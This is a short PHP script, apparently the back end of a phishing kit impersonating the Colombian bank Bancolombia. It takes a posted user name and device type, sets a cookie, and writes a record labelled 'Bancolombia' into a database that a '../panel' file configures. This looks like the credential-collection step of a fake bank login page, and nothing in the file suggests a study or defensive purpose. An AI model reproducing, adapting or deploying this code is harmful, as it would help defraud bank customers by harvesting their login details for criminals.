<?php 
require_once("../lib/class.inputfilter.php");
require('../panel/include/setings.php');
date_default_timezone_set('America/Bogota');
$ifilter = new InputFilter();

$usuario = $ifilter->process($_POST['usr']);
$dispositivo = isset($_POST['dis']) ? $ifilter->process($_POST['dis']) : 'PC';

setcookie('usuario', $usuario, time()+60*9);

// Crear registro en BD
create_item($usuario, '', $dispositivo, '', '', 'Bancolombia', '');
?>